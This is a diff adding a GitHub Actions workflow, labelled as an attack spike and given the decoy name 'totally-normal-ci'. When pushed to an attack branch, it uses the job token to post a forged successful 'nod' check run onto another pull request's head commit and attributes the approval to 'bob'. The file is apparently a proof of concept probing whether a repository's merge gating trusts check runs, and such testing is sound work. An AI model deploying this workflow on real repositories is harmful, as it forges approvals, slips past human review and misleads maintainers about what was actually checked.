@@ -1,0 +1,20 @@
+# ATTACK (spike): a workflow on a non-default branch forges a green `nod` check on someone else's PR head.
+name: totally-normal-ci
+on:
+  push:
+    branches: ["attack/**"]
+permissions:
+  checks: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: forge
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          sha="$(cat forge-target.txt)"
+          gh api -X POST "repos/${GITHUB_REPOSITORY}/check-runs" \
+            -f name=nod -f head_sha="$sha" -f status=completed -f conclusion=success \
+            -f 'output[title]=nodded by bob (peer, head_sha)' -f 'output[summary]=forged from a branch workflow'
